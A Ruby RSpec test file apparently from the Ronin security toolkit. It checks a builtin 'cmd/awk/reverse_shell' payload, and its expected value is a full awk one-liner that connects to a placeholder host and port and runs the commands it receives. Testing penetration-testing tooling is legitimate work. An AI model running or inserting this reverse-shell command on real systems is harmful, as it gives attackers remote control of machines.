require 'spec_helper'
require 'ronin/payloads/builtin/cmd/awk/reverse_shell'

describe Ronin::Payloads::CMD::Awk::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/awk/reverse_shell'" do
      expect(subject.id).to eq('cmd/awk/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `awk` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{awk 'BEGIN {s = "/inet/tcp/0/#{host}/#{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null}
      )
    end
  end
end
